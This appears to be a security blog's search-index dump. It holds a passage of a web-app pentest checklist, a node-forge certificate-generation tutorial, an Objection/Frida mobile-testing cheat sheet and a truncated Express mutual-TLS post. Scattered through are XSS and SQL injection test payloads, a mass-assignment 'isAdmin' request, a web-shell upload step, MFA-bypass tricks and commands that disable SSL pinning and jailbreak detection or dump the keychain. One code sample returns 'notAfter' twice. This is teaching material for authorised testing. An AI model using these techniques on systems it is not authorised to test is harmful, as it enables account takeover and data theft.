The same session cookie that was given to a user pre-authentication SHOULD NOT be used post authentication.Session Cookie Not ChangingA rare extension of Session Fixation where the session cookie for a user is the same for every login. This can happen if the application uses the user’s ID (or similar) as a session cookie.Session Not Invalidated After Changing PasswordCheck if the user it logged out and has their session invalidated after changing their password.Decode CookiesAttempt to decode cookies values. Session cookies should be completely random and unpredictable. This is a GOOD session cookie WK0idcE45L7AB066B5B34tNZMLsmkGAx. This is a BAD session cookie VXNlcjpKb2huU21pdGg6MjAyMS0wOS0yODoyMi0xNi01Mg. (I’ll let you figure out why).Lack of Logout FunctionalityEnsure the application has an explicit logout button that invalidates a user’s session.AuthenticationLogin with no PasswordAttempt to login to the application without using a password. This should be checked on the front-end and through an interception proxy as most apps won’t submit an empty password on login.Lack of MFACheck if the application requires MFA to login. Some applications may not require MFA such as low risk internal applications. Internet facing applications should almost always support MFA.Account LockoutVerify that a user’s account gets locked out after a certain number of incorrect attempts. This is to prevent the bruteforcing of passwords.Account Lockout on Change PasswordVerify that a user’s account gets locked out after a certain number of incorrect attempts at changing a user’s password.No MFA LockoutVerify that the user account get’s locked out and/or the OTP code is invalidated if the OTP code is brute forced.MFA BypassIf a well known solution is used, check online for known bypasses.Common techniques include: OTP is not actually required at all, the server has just told us OTP is required. Server responses can be modified and the front-end can send us to the application. I.e. the server might respond with {&quot;success&quot;:false} after a successful username &amp;amp; password auth. Changing this to {&quot;success&quot;:true} may trick the front-end into sending additional requests or redirecting to the application without needing the OTP code. Forcefully browsing to the application after being presented with the OTP screen. This can happen if the user is actually logged in after providing the username &amp;amp; password, and providing a correct OTP acts as a redirect. No bruteforce protection in place OTP codes from other users. OTP codes should only work for one user. I.e. OTP codes sent to user A, should not work for User B. OTP code reuse. Check if previously used OTP still work. Only one code should work at a time, all other codes should be invalidated. Client-side validation. OTP code returned to the front-end and the OTP check only happens client-side.User Enumeration - Error BasedVerify the application returns the same message on a failed login attempt when using a valid and invalid username. If usernames can be enumerated, password spraying can be done against the application with a much higher chance of success. GOOD error message The Username/Password is Incorrect. BAD error message Username does not exist.User Enumeration - Time BasedVerify the application takes the same amount of time to return an error message when a valid and invalid username is provided.An example of how this can go wrong: Username is checked if it’s in the Database If the username is invalid then return an error message. If the username is valid then check the password hash (this can take a second or two if bcrypt with multiple rounds is used). If password is wrong return an error message.Because hashing can sometimes take a noticeable amount of time, a valid and invalid user can be enumerated based on the response time.Password StrengthEnsure the application has a password complexity requirement so as to not allow very weak passwords such as a. As an extension, common weak passwords such as Password1, Welcome1!, Qwerty@123 that technically meet the application’s password complexity requirements should be blacklisted.Password HistoryEnsure the application enforces a password history. A user should not be able to change their password to one of their previous few passwords.Case Insensitive PasswordEnsure the application checks the case of passwords that are entered. There may be limitation on very old systems &amp;amp; mainframes, but this is not the case for modern systems.Client-Side Password RequirementsEnsure the password complexity requirement is enforced server-side as well as client-side. Use an interception proxy to change the password to ensure the application doesn’t solely rely on client-side controls.Password Not Required to Change PasswordEnsure that the current password is required to update a user’s password. This is a requirement so that accounts that have been temporarily taken over (perhaps via a leaked session cookie, or leaving a computer unattended) are harder to fully take over. If an attacker only has a victim’s session token, and not their password, then the attack’s access should be limited to the session only. If they can change the password without the current password, then they can fully take over the account and lock the victim out.Use of Basic AuthenticationEnsure the application does not use Basic Authentication. Basic Auth sends the username and password in every request, increasing the likelihood that they will be leaked. In addition, using Basic Auth provides no effective session management.No Method to Change PasswordCheck if the application has functionality to change a user’s password.User Account DoSVerify if the reset password functionality immediately invalidates a user’s current password. If so then a user can be DoS’d by an attacker by only knowing their username. An more secure method is for a user to be sent a reset link, asked to answer security questions, then prompted to enter a new password.AuthorisationRemove Cookies ONE at a timeRemove one cookie at a time to check what cookies are actually required for a request to succeed. It’s common for web applications to only have one session cookie, and the rest are for tracking and/or application settings/options.Remove ALL Cookies and/or TokensVerify that APIs actually requires a cookies/tokens to be accessed. Same goes for update and delete APIs.JWT ChecksIf the application uses JWTs, verify they have been implemented correctly. This may be useful JWT Fuzzer Tool.Unauthorised Data AccessEnsure users can not access data that is not accessable to them via the UI. If a user has some documents assigned to them that they can see, attempt to access other documents that are not assigned to the user. This also includes update and deleting data that has not been specifically assigned to a user.Unauthorised API AccessEnsure lower privilege users don’t have access to resources they shouldn’t. If only Admins can access /userlist, ensure low privilege users can not. This differs from the previous point as here we are talking about entire endpoints and/or sections of the application that shouldn’t be accessed.Horizontal Privilege EscalationAttempt to perform actions on resources of other users at the same level. E.g. If User 1 can only access Document ABC, and User 2 can access Document DEF and GHI, attempt to perform CRUD operations on documents DEF and GHI even if it’s not possible through the UI.Vertical Privilege EscalationAttempt to perform actions on resources that required a higher privilege level (e.g. Admin or Manager privilege).Forceful BrowsingAttempt to directly access files that are in the web root folder that are not listed by the application and see if these are accessable. Examples include: Config files Environment files Uploaded files through the applicationCSRFAttempt to perform a cross-site request forgery (CSRF) attack with a PoC and prove it’s possible. Even if it looks like it should work, verify it actually does.CSWSHIf the application uses web-sockets, attempt to perform a cross-site web socket hijacking (CSWSH) attack. Ensure either the session cookie has a SameSite value that isn’t None, and/or the web-socket upgrade request Origin header is validated, as this is a restricted header that can’t be modified in the browser.Data StorageSensitive CookiesVerify that sensitive information is not stored in cookie values or as cookie names. Examples include passwords/secrets that are persistent and rarely (if ever) change.Session StorageCheck the browser Session Storage for sensitive information. Session Storage can be accessed via JavaScript meaning any data stored here is accessable to an attacker via an XSS attack.Session Storage can be accessed in JavaScript using sessionStorage. A specific item in Session Storage can be retrieved using sessionStorage.getItem(&#39;keyName&#39;).Local StorageCheck the browser Local Storage for sensitive information. Local Storage can be accessed via JavaScript meaning any data stored here is accessable to an attacker via an XSS attack. Local Storage differs from Session Storage as it is persistent across page and browser reloads (assuming not in Private-Mode).Local Storage can be accessed in JavaScript using localStorage. A specific item in Local Storage can be retrieved using localStorage.getItem(&#39;keyName&#39;).Window ObjectCheck the global window object for any sensitive data that may be stored there. The window object is a globally accessable location by JavaScript executing on the front-end. It can be a convenient place to store information, but can lead to insecurities if used incorrectly to store sensitive data. The window object is accessable to an attacker via an XSS attack, therefore is not a safe place to store sensitive data. The window object can be access using window. The data stored in window can be view more cleanly using Object.entries(window).Returned DataWARNING this check is HIGHLY application specific and should be judged on an app by app basis.Ensure the data returned in HTML pages and via APIs do not contain unnecessary sensitive data. An example would be returning passwords or password hashes to a user. This type of information is not required for a majority of cases and a user (and admin in most cases) should not be able to see their password after it has been set.Input ValidationLack of ValidationEnsure that fields only support the type of data that is expected. This can lead to numerous issues, notably XSS and SQLi. Some examples: Check Phone Number fields only supports Numbers, Plus sign and whitespace. Check fields like names don’t support special characters if not required such as &amp;lt;&amp;gt;()[]{}&quot;&#39;~\\/?%$ Sort direction fields that normally only contain asc or desc.Client-Side ValidationEnsure that the application does not rely on Client-side validation ONLY. Client-side validation is perfectly fine and is necessary for a good user experience, but validation must be performed Server-side as well.Reflected ParametersCheck if parameters provided in a request are reflected in the response. A common example would be a query parameter that is reflected in the response HTML and not escaped properly. This can lead to Reflected XSS.Output EncodingEnsure special characters are correctly escaped when they are displayed. Some Examples: &amp;lt; as &amp;amp;lt; &amp;gt; as &amp;amp;gt; &quot; as &amp;amp;quot;Attempt to bypass the escaping using different encoding.CSV InjectionIf the application has functionality that allows data to exported to a CSV file, check if CSV injection payloads can be included in the output document.Error MessagesCheck if the application returns descriptive Errors and/or Stack Traces if invalid input is provided. Query parameters, Body parameters, Tokens, Cookies and Header values should all be fuzzed for this.Parameter PollutionAdd multiple query parameters with the same name and see how the server handles it. Different server software will handle this differently (some take the first value, some the last, some concatenate all of them).Mass AssignmentAdd additional unexpected keys to requests and see if the server accepts them. This can happen if the entire JSON object is used when preforming a Database operation, instead of copying out the required keys. It can also happen if no validation is done on the provided data (not checking that only the required keys were provided and no others). Example:POST /register HTTP/1.1&amp;lt;---...---&amp;gt;{&quot;email&quot;:&quot;user1@test.com&quot;}HTTP/1.1 200 OK&amp;lt;---...---&amp;gt;{&quot;email&quot;:&quot;user1@test.com&quot;,&quot;userId&quot;:&quot;abcefg&quot;,&quot;isAdmin&quot;:false}Try adding the isAdmin key to the initial request:POST /register HTTP/1.1&amp;lt;---...---&amp;gt;{&quot;email&quot;:&quot;user2@test.com&quot;,&quot;isAdmin&quot;:true}HTTP/1.1 200 OK&amp;lt;---...---&amp;gt;{&quot;email&quot;:&quot;user2@test.com&quot;,&quot;userId&quot;:&quot;123456&quot;,&quot;isAdmin&quot;:true}File UploadVerify file upload functionality works as intended: User should not be able to control where the file is stored on the server. Accepted file types should be enforced server-side. Check if Anti-virus is installed on the Server (EICAR). Check if files are stored on disk (they might be stored in the DB, or elsewhere). Check if uploaded files are in a simple location like /upload/my-uploaded-file.aspx. Upload Shell if applicable.Directory TraversalCheck if files outside of the web root can be accessed. This occurs when no validation is performed on the path and file that is trying to be accessed.Server ConfigurationDirectory ListingCheck if there is Directory Listing on the web server which enables a user to see the files on server. This should rarely ever be required for a web application, except for a simple file share server.TLS ConfigurationCheck the TLS configuration of the application and see if older SSL/TLS versions are supported like SSLv2, SSLv3, TLSv1.0 and TLSv1.1. Check for weak ciphers and other insecure settings. Use a tool like SSLScan or TestSSL.Wildcard CertificateCheck if the certificate used by the web application is a wildcard certificate. Wildcard certificates are not any less secure cryptographically, however, if compromised they are a bigger risk as the certificate is valid for multiple domains.TRACE Method EnabledCheck if web server supports the HTTP TRACE method. Replace methods such as GET or POST with TRACE and see if the request data is reflected in the server response. This is almost unexploitable now due to browsers no longer supporting the TRACE method for security reasons (Cross-Site Tracing).Outdated Libraries in UseCheck for outdated libraries/software used by the web application. Common outdated software includes: jQuery Bootstrap React Angular Tomcat IIS &amp;amp; ASP.NET PHPSensitive Information in URLEnsure no sensitive information is sent in the URL. This includes data such as Passwords, API keys and Session Tokens. URLs can be stored in browser history, caches, and leaked via Referer header.Lack of Subresource Integrity ChecksEnsure cross-origin resources contain integrity checks. Loading scripts cross-origin can increase the attack surface of an application. Should that cross-origin resource be compromised, an attacker now has an additional pathway into the application.&amp;lt;script src=&quot;https://test.com/special-library.js&quot; integrity=&quot;sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC&quot; crossorigin=&quot;anonymous&quot;&amp;gt;&amp;lt;/script&amp;gt; More info at MDN Web Docs: Subresource IntegrityLack of HTTPSEnsure the website utilises TLS and doesn’t perform actions unencrypted over HTTP.Use of HTTP (no TLS)Ensure the website can not be used over HTTP and instead must be used over HTTPS. Servers often support HTTP (no TLS) and will immediately redirect to a HTTPS version of the application. This is okay, however it becomes an issue if application functionality can be performed over unencrypted communication.A server that supports HTTP and HTTPS has the following issue: Use of HTTP (no TLS)A server that supports HTTP, but NOT HTTPS has the following issues: Use of HTTP (no TLS) Lack of HTTPSSequential IDsCheck the application doesn’t use sequential ID numbers for resources. If you create a document in the application and it has an ID of 3074, create another one and see if the number is slightly higher or is the next number in the sequence. Having sequential ID numbers makes resources much easier to enumerate. ID numbers should be long and completely random.No WAFCheck if common attack payloads get blocked by a Web Application Firewall (WAF). Sending requests with such payloads should result in a different error screen or a 500 response with no information.Common attack payloads that should get blocked: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt; SELECT @@version ’ UNION SELECT 1,2,3–POST Requests as GET RequestsAttempt to change POST requests to GET requests to see if the server accepts the parameters as query parameters instead.Rate LimitingCheck if the server implements any sort of rate limiting to prevent DoS, or brute forcing." }, { "title": "Certificate Generate Pure NodeJS", "url": "/posts/certificate-generation-pure-nodejs/", "categories": "security, web", "tags": "web, http, https, security, certificates, ca, cryptography", "date": "2021-09-21 01:07:50 +1100", "snippet": "This post will show example code of how to generate a Certificate Authority and Host Certificates (signed by the CA we generate) using NodeJS without using OpenSSL. This will be done using the node-forge npm module. This post will assume you are familiar with Certificates Authorities and Host Certificates already. There is not much explanation given as the code is well documented. Install Package Setup Generating a Certificate Authority Generating a Host Certificate Full CodeInstall PackageFirst step is to install the required npm package:npm i node-forgeSetupTo start with we’ll need some helper functions for creating valid serial numbers, and also for generating the notBefore and notAfter dates. We will also define some constants that will be included in all the certificates (Country, State, Locality), as well as a boilerplate class with two methods we will fill in later.const forge = require(&#39;node-forge&#39;);const makeNumberPositive = (hexString) =&amp;gt; { let mostSignificativeHexDigitAsInt = parseInt(hexString[0], 16); if (mostSignificativeHexDigitAsInt &amp;lt; 8) return hexString; mostSignificativeHexDigitAsInt -= 8 return mostSignificativeHexDigitAsInt.toString() + hexString.substring(1)}// Generate a random serial number for the Certificateconst randomSerialNumber = () =&amp;gt; { return makeNumberPositive(forge.util.bytesToHex(forge.random.getBytesSync(20)));}// Get the Not Before Date for a Certificate (will be valid from 2 days ago)const getCertNotBefore = () =&amp;gt; { let twoDaysAgo = new Date(Date.now() - 60*60*24*2*1000); let year = twoDaysAgo.getFullYear(); let month = (twoDaysAgo.getMonth() + 1).toString().padStart(2, &#39;0&#39;); let day = twoDaysAgo.getDate(); return new Date(`${year}-${month}-${day} 00:00:00Z`);}// Get Certificate Expiration Date (Valid for 90 Days)const getCertNotAfter = (notBefore) =&amp;gt; { let ninetyDaysLater = new Date(notBefore.getTime() + 60*60*24*90*1000); let year = ninetyDaysLater.getFullYear(); let month = (ninetyDaysLater.getMonth() + 1).toString().padStart(2, &#39;0&#39;); let day = ninetyDaysLater.getDate(); return new Date(`${year}-${month}-${day} 23:59:59Z`);}// Get CA Expiration Date (Valid for 100 Years)const getCANotAfter = (notBefore) =&amp;gt; { let year = notBefore.getFullYear() + 100; let month = (notBefore.getMonth() + 1).toString().padStart(2, &#39;0&#39;); let day = notBefore.getDate(); return new Date(`${year}-${month}-${day} 23:59:59Z`);}const DEFAULT_C = &#39;Australia&#39;;const DEFAULT_ST = &#39;Victoria&#39;;const DEFAULT_L = &#39;Melbourne&#39;;class CertificateGeneration { static CreateRootCA() {} static CreateHostCert(hostCertCN, validDomains, rootCAObject) {}}Generating a Certificate Authoritystatic CreateRootCA() { // Create a new Keypair for the Root CA const { privateKey, publicKey } = forge.pki.rsa.generateKeyPair(2048); // Define the attributes for the new Root CA const attributes = [{ shortName: &#39;C&#39;, value: DEFAULT_C }, { shortName: &#39;ST&#39;, value: DEFAULT_ST }, { shortName: &#39;L&#39;, value: DEFAULT_L }, { shortName: &#39;CN&#39;, value: &#39;My Custom Testing RootCA&#39; }]; const extensions = [{ name: &#39;basicConstraints&#39;, cA: true }, { name: &#39;keyUsage&#39;, keyCertSign: true, cRLSign: true }]; // Create an empty Certificate const cert = forge.pki.createCertificate(); // Set the Certificate attributes for the new Root CA cert.publicKey = publicKey; cert.privateKey = privateKey; cert.serialNumber = randomSerialNumber(); cert.validity.notBefore = getCertNotBefore(); cert.validity.notAfter = getCANotAfter(cert.validity.notBefore); cert.setSubject(attributes); cert.setIssuer(attributes); cert.setExtensions(extensions); // Self-sign the Certificate cert.sign(privateKey, forge.md.sha512.create()); // Convert to PEM format const pemCert = forge.pki.certificateToPem(cert); const pemKey = forge.pki.privateKeyToPem(privateKey); // Return the PEM encoded cert and private key return { certificate: pemCert, privateKey: pemKey, notBefore: cert.validity.notBefore, notAfter: cert.validity.notAfter };}Generating a Host Certificatestatic CreateHostCert(hostCertCN, validDomains, rootCAObject) { if (!hostCertCN.toString().trim()) throw new Error(&#39;&quot;hostCertCN&quot; must be a String&#39;); if (!Array.isArray(validDomains)) throw new Error(&#39;&quot;validDomains&quot; must be an Array of Strings&#39;); if (!rootCAObject || !rootCAObject.hasOwnProperty(&#39;certificate&#39;) || !rootCAObject.hasOwnProperty(&#39;privateKey&#39;)) throw new Error(&#39;&quot;rootCAObject&quot; must be an Object with the properties &quot;certificate&quot; &amp;amp; &quot;privateKey&quot;&#39;); // Convert the Root CA PEM details, to a forge Object let caCert = forge.pki.certificateFromPem(rootCAObject.certificate); let caKey = forge.pki.privateKeyFromPem(rootCAObject.privateKey); // Create a new Keypair for the Host Certificate const hostKeys = forge.pki.rsa.generateKeyPair(2048); // Define the attributes/properties for the Host Certificate const attributes = [{ shortName: &#39;C&#39;, value: DEFAULT_C }, { shortName: &#39;ST&#39;, value: DEFAULT_ST }, { shortName: &#39;L&#39;, value: DEFAULT_L }, { shortName: &#39;CN&#39;, value: hostCertCN }]; const extensions = [{ name: &#39;basicConstraints&#39;, cA: false }, { name: &#39;nsCertType&#39;, server: true }, { name: &#39;subjectKeyIdentifier&#39; }, { name: &#39;authorityKeyIdentifier&#39;, authorityCertIssuer: true, serialNumber: caCert.serialNumber }, { name: &#39;keyUsage&#39;, digitalSignature: true, nonRepudiation: true, keyEncipherment: true }, { name: &#39;extKeyUsage&#39;, serverAuth: true }, { name: &#39;subjectAltName&#39;, altNames: validDomains.map(domain =&amp;gt; { return { type: 2, value: domain } }) }]; // Create an empty Certificate let newHostCert = forge.pki.createCertificate(); // Set the attributes for the new Host Certificate newHostCert.publicKey = hostKeys.publicKey; newHostCert.serialNumber = randomSerialNumber(); newHostCert.validity.notBefore = getCertNotBefore(); newHostCert.validity.notAfter = getCertNotAfter(newHostCert.validity.notBefore); newHostCert.setSubject(attributes); newHostCert.setIssuer(caCert.subject.attributes); newHostCert.setExtensions(extensions); // Sign the new Host Certificate using the CA newHostCert.sign(caKey, forge.md.sha512.create()); // Convert to PEM format let pemHostCert = forge.pki.certificateToPem(newHostCert); let pemHostKey = forge.pki.privateKeyToPem(hostKeys.privateKey); return { certificate: pemHostCert, privateKey: pemHostKey, notAfter: newHostCert.validity.notBefore, notAfter: newHostCert.validity.notAfter };}Full Codeconst forge = require(&#39;node-forge&#39;);const makeNumberPositive = (hexString) =&amp;gt; { let mostSignificativeHexDigitAsInt = parseInt(hexString[0], 16); if (mostSignificativeHexDigitAsInt &amp;lt; 8) return hexString; mostSignificativeHexDigitAsInt -= 8 return mostSignificativeHexDigitAsInt.toString() + hexString.substring(1)}// Generate a random serial number for the Certificateconst randomSerialNumber = () =&amp;gt; { return makeNumberPositive(forge.util.bytesToHex(forge.random.getBytesSync(20)));}// Get the Not Before Date for a Certificate (will be valid from 2 days ago)const getCertNotBefore = () =&amp;gt; { let twoDaysAgo = new Date(Date.now() - 60*60*24*2*1000); let year = twoDaysAgo.getFullYear(); let month = (twoDaysAgo.getMonth() + 1).toString().padStart(2, &#39;0&#39;); let day = twoDaysAgo.getDate(); return new Date(`${year}-${month}-${day} 00:00:00Z`);}// Get Certificate Expiration Date (Valid for 90 Days)const getCertNotAfter = (notBefore) =&amp;gt; { let ninetyDaysLater = new Date(notBefore.getTime() + 60*60*24*90*1000); let year = ninetyDaysLater.getFullYear(); let month = (ninetyDaysLater.getMonth() + 1).toString().padStart(2, &#39;0&#39;); let day = ninetyDaysLater.getDate(); return new Date(`${year}-${month}-${day} 23:59:59Z`);}// Get CA Expiration Date (Valid for 100 Years)const getCANotAfter = (notBefore) =&amp;gt; { let year = notBefore.getFullYear() + 100; let month = (notBefore.getMonth() + 1).toString().padStart(2, &#39;0&#39;); let day = notBefore.getDate(); return new Date(`${year}-${month}-${day} 23:59:59Z`);}const DEFAULT_C = &#39;Australia&#39;;const DEFAULT_ST = &#39;Victoria&#39;;const DEFAULT_L = &#39;Melbourne&#39;;class CertificateGeneration { static CreateRootCA() { // Create a new Keypair for the Root CA const { privateKey, publicKey } = forge.pki.rsa.generateKeyPair(2048); // Define the attributes for the new Root CA const attributes = [{ shortName: &#39;C&#39;, value: DEFAULT_C }, { shortName: &#39;ST&#39;, value: DEFAULT_ST }, { shortName: &#39;L&#39;, value: DEFAULT_L }, { shortName: &#39;CN&#39;, value: &#39;My Custom Testing RootCA&#39; }]; const extensions = [{ name: &#39;basicConstraints&#39;, cA: true }, { name: &#39;keyUsage&#39;, keyCertSign: true, cRLSign: true }]; // Create an empty Certificate const cert = forge.pki.createCertificate(); // Set the Certificate attributes for the new Root CA cert.publicKey = publicKey; cert.privateKey = privateKey; cert.serialNumber = randomSerialNumber(); cert.validity.notBefore = getCertNotBefore(); cert.validity.notAfter = getCANotAfter(cert.validity.notBefore); cert.setSubject(attributes); cert.setIssuer(attributes); cert.setExtensions(extensions); // Self-sign the Certificate cert.sign(privateKey, forge.md.sha512.create()); // Convert to PEM format const pemCert = forge.pki.certificateToPem(cert); const pemKey = forge.pki.privateKeyToPem(privateKey); // Return the PEM encoded cert and private key return { certificate: pemCert, privateKey: pemKey, notBefore: cert.validity.notBefore, notAfter: cert.validity.notAfter }; } static CreateHostCert(hostCertCN, validDomains, rootCAObject) { if (!hostCertCN.toString().trim()) throw new Error(&#39;&quot;hostCertCN&quot; must be a String&#39;); if (!Array.isArray(validDomains)) throw new Error(&#39;&quot;validDomains&quot; must be an Array of Strings&#39;); if (!rootCAObject || !rootCAObject.hasOwnProperty(&#39;certificate&#39;) || !rootCAObject.hasOwnProperty(&#39;privateKey&#39;)) throw new Error(&#39;&quot;rootCAObject&quot; must be an Object with the properties &quot;certificate&quot; &amp;amp; &quot;privateKey&quot;&#39;); // Convert the Root CA PEM details, to a forge Object let caCert = forge.pki.certificateFromPem(rootCAObject.certificate); let caKey = forge.pki.privateKeyFromPem(rootCAObject.privateKey); // Create a new Keypair for the Host Certificate const hostKeys = forge.pki.rsa.generateKeyPair(2048); // Define the attributes/properties for the Host Certificate const attributes = [{ shortName: &#39;C&#39;, value: DEFAULT_C }, { shortName: &#39;ST&#39;, value: DEFAULT_ST }, { shortName: &#39;L&#39;, value: DEFAULT_L }, { shortName: &#39;CN&#39;, value: hostCertCN }]; const extensions = [{ name: &#39;basicConstraints&#39;, cA: false }, { name: &#39;nsCertType&#39;, server: true }, { name: &#39;subjectKeyIdentifier&#39; }, { name: &#39;authorityKeyIdentifier&#39;, authorityCertIssuer: true, serialNumber: caCert.serialNumber }, { name: &#39;keyUsage&#39;, digitalSignature: true, nonRepudiation: true, keyEncipherment: true }, { name: &#39;extKeyUsage&#39;, serverAuth: true }, { name: &#39;subjectAltName&#39;, altNames: validDomains.map(domain =&amp;gt; { return { type: 2, value: domain } }) }]; // Create an empty Certificate let newHostCert = forge.pki.createCertificate(); // Set the attributes for the new Host Certificate newHostCert.publicKey = hostKeys.publicKey; newHostCert.serialNumber = randomSerialNumber(); newHostCert.validity.notBefore = getCertNotBefore(); newHostCert.validity.notAfter = getCertNotAfter(newHostCert.validity.notBefore); newHostCert.setSubject(attributes); newHostCert.setIssuer(caCert.subject.attributes); newHostCert.setExtensions(extensions); // Sign the new Host Certificate using the CA newHostCert.sign(caKey, forge.md.sha512.create()); // Convert to PEM format let pemHostCert = forge.pki.certificateToPem(newHostCert); let pemHostKey = forge.pki.privateKeyToPem(hostKeys.privateKey); return { certificate: pemHostCert, privateKey: pemHostKey, notAfter: newHostCert.validity.notBefore, notAfter: newHostCert.validity.notAfter }; }}let CA = CertificateGeneration.CreateRootCA();/* The following certificate: - Will be called &#39;testing.com&#39;. - Will be valid for &#39;testing.com&#39; and &#39;test.com&#39;. - Will be signed by the CA we just created above.*/let hostCert = CertificateGeneration.CreateHostCert(&#39;testing.com&#39;, [&#39;testing.com&#39;, &#39;test.com&#39;], CA);console.log(CA.certificate);console.log(hostCert.certificate);" }, { "title": "Objection Quick Start", "url": "/posts/objection-quick-start/", "categories": "security, mobile", "tags": "security, mobile, ios, android, frida, objection", "date": "2021-09-15 21:51:10 +1100", "snippet": " Setup Install Objection Test Objection Find Application Attach to Application Android &amp;amp; iOS Files HTTP Server Hooking Other Android SSLPinning &amp;amp; Root Detection Android Hooking iOS SSLPinning &amp;amp; Jailbreak Detection iOS Application Info iOS DataStorage SetupInstall ObjectionThe objection python package will need to be installed as well as frida-tools:pip3 install frida-tools objectionTest ObjectionEnsure the package is working by running the objection command:root@kali:~# objectionUsage: objection [OPTIONS] COMMAND [ARGS]... _ _ _ _ ___| |_|_|___ ___| |_|_|___ ___ | . | . | | -_| _| _| | . | | |___|___| |___|___|_| |_|___|_|_| |___|(object)inject(ion) Runtime Mobile Exploration by: @leonjza from @sensepost By default, communications will happen over USB, unless the --network option is provided.Find ApplicationUse Frida to check for installed applications on the phone:Show running applications:frida-ps -Ua -U for USB mode -a for applications onlyShow all installed applications:frida-ps -Uai -i for install applicationsYou should see something like this:root@kali:~# frida-ps -Ua PID Name Identifier ---- ---------- -------------------------2594 DuckDuckGo com.duckduckgo.mobile.iosAttach to ApplicationOnce we know the name of our target application, we can attach to it with the following command:objection -g NAME explore Where NAME is DuckDuckGo or com.duckduckgo.mobile.ios in the above example.A command can be executed as soon as Objection attaches to an application using:objection -g com.duckduckgo.mobile.ios explore --startup-command &quot;COMMAND&quot; COMMAND might be something like ios sslpinning disable on an iPhone.A single command can be executed instead of exploring the application:objection -g com.duckduckgo.mobile.ios run &quot;COMMAND&quot; COMMAND might be something like ios cookies get on an iPhone.Android &amp;amp; iOSFiles Description Command Get Environment Info env View files in current Dir ls Print current Dir pwd Print file contents file cat FILENAME Download file (from Phone) file download PHONE_FILE [PC_FILE] Upload file (to Phone) file upload PC_FILE [PHONE_FILE] HTTP Server Description Command Start HTTP Server (in current dir) file http start Stop HTTP Server file http stop Status of HTTP Server file http status Hookingios examples used below. Commands should work for both ios and android. Description Command List Application Classes ios hooking list classes Search for Class ios hooking search classes SEARCH_STRING List Class Methods ios hooking list class_methods CLASS_NAME Search for Methods ios hooking search methods SEARCH_STRING Hook ALL Class Methods (View params) ios hooking watch class CLASS_NAME Hook Single Class Methods ios hooking watch method &quot;-[CLASS_NAME METHOD_NAME]&quot; –dump-args –dump-return –dump-backtrace Change Boolean Method Return Value ios hooking set return_value &quot;-[CLASS_NAME METHOD_NAME]&quot; false Generate Frida hooking template ios hooking generate simple CLASS_NAME Other Description Command View Jobs jobs list Stop/Kill Jobs jobs kill JOB_ID AndroidSSLPinning &amp;amp; Root DetectionAndroid Hooking Description Command List Activities android hooking list activities List Receivers android hooking list receivers List Services android hooking list services Get Current Activity android hooking get current_activity iOSSSLPinning &amp;amp; Jailbreak Detection Description Command Disable SSLPinning ios sslpinning disable Disable SSLPinning (quiet mode) ios sslpinning disable –quiet Disable Jailbreak Detection ios jailbreak disable iOS Application Info Description Command Get Binary Info ios info binary Get PList Files ios plist cat Info.plist Get Application Bundles ios bundles list_bundles Get External Frameworks ios bundles list_frameworks iOS DataStorage Description Command Get Keychain ios keychain dump Get Keychain (Auto-Decode) ios keychain dump –smart Get Keychain (Save-As JSON) ios keychain dump –json keychain.json View Cookies ios cookies get View NSUserDefaults ios nsuserdefaults get View NSURLCredentialStorage ios nsurlcredentialstorage dump Pasteboard Monitor ios pasteboard monitor " }, { "title": "NodeJS Express Cert Based Mutual Auth", "url": "/posts/express-cert-based-mutual-auth/", "categories": "javascript, nodejs", "tags": "javascript, express, certificate, web, security, https, http, nodejs, server", "date": "2021-09-07 08:25:38 +1100", "snippet": "In this post we’ll look at how to add Certificate Based Mutual Authentication to an express HTTPS server. This will allow us to require a User Certificate before being able to communicate with out express server.This post will assume that you already know how to setup a HTTPS server using express. If you don’t know how to, you can learn here. Require Certificate Custom Authorisation Logic Why Custom Logic? Full CodeRequire CertificateTo enable Cert Based Mutual Auth, some additional parameters (ca, requestCert &amp;amp; rejectUnauthorized) need to be provided in the Server Options:const serverOptions = { // Certificate Settings ca: fs.readFileSync(path.join(__dirname, &#39;certs/custom_root_ca.crt&#39;)), cert: fs.readFileSync(path.join(__dirname, &#39;certs/host.crt&#39;)), key: fs.readFileSync(path.join(__dirname, &#39;certs/host.key&#39;)), // Cert-Based Mutual Auth settings requestCert: true, rejectUnauthorized: true,} ca specifies the Certificate Authority (CA) that was used to sign the User Certificates that will be provided. requestCert forces the client to send a User Certificate upon connection. rejectUnauthorized sets whether the client connection should be terminated if the Users Cert verification fails.Custom Authorisation LogicCustom logic can be added to the server instead of immediately rejecting the connection. We can do it by setting rejectUnauthorized to false and adding the following code:const path = require(&#39;path&#39;);const fs = require(&#39;fs&#39;);const express = require(&#39;express&#39;);const app = express();const serverOptions = { // Certificate Settings ca: fs.readFileSync(path.join(__dirname, &#39;certs/custom_root_ca.crt&#39;)), cert: fs.readFileSync(path.join(__dirname, &#39;certs/host.crt&#39;)), key: fs.readFileSync(path.join(__dirname, &#39;certs/host.key&#39;)), // Cert-Based Mutual Auth settings requestCert: true, rejectUnauthorized: false,}const server = require(&#39;https&#39;).Server(serverOptions, app);app.use((req, res, next) =&amp;gt; { try { // Get the Certificate the User provided let cert = req.socket.getPeerCertificate(); // The Certificate is VALID if (req.client.authorized) { console.log(`Certificate &quot;${cert.subject.CN}&quot; is VALID and was issued by &quot;${cert.issuer.CN}&quot;`); next(); } // The Certificate is NOT VALID else if (cert.subject) { console.log(`Certificates from &quot;${cert.issuer.CN}&quot; are NOT VALID. User &quot;${cert.subject.CN}&quot;`); res.sendStatus(403); } // A Certificate was NOT PROVIDED else { console.log(`No Certificate provided by the client`); res.status(403).send(`Certificate Required`); } } catch (err) { console.log(err); res.sendStatus(404); }});Why Custom Logic?Why would you do the above logic? Great question!In general, you shouldn’t. If your application requires a certificate to be accessed period, you SHOULDN’T use custom logic. You should set rejectUnauthorized to true and let express do the heavy lifting.However, there are cases when you might need to handle the logic yourself, such as only requiring a certificate to access certain parts of an application (like /admin).app.use((req, res, next) =&amp;gt; { try { // Get the Certificate the User provided let cert = req.socket.getPeerCertificate(); // If the user isn&#39;t accessing Admin area, DON&#39;T require a Certificate if (!req.path.startsWith(&#39;/admin&#39;)) { next(); } // The Certificate is VALID else if (req.client.authorized) { console.log(`Certificate &quot;${cert.subject.CN}&quot; is VALID and was issued by &quot;${cert.issuer.CN}&quot;`); next(); } // The Certificate is NOT VALID else if (cert.subject) { console.log(`Certificates from &quot;${cert.issuer.CN}&quot; are NOT VALID. User 